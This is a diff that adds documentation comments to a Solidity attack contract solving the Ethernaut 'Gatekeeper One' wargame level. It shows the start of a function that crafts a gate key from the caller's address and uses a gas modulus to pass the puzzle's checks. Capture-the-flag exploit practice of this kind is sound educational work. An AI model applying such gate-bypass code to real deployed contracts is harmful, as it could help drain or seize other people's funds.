@@ -4,7 +4,22 @@ pragma solidity ^0.8.0;
 
 import "./interfaces/IGatekeeperOne.sol";
 
+/**
+ * @title Gatekeeper One Attack (Ethernaut Challenge Level 13 - Gatekeeper One)
+ * @author Emre Tepe (@emretepedev)
+ * @notice Attack contract for level 13
+ * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A
+ * @custom:security-contact emretepedev@gmail.com
+ */
 contract GatekeeperOneAttack {
+    /*//////////////////////////////////////////////////////////////
+                                Attack
+    //////////////////////////////////////////////////////////////*/
+
+    /**
+     * @notice Attack and solve the level
+     * @param target Address of target contract
+     */
     function attack(IGatekeeperOne target) external {
         bytes8 key = bytes8(uint64(1 + type(uint32).max + uint16(uint160(msg.sender))));
         uint256 mod = 8191;
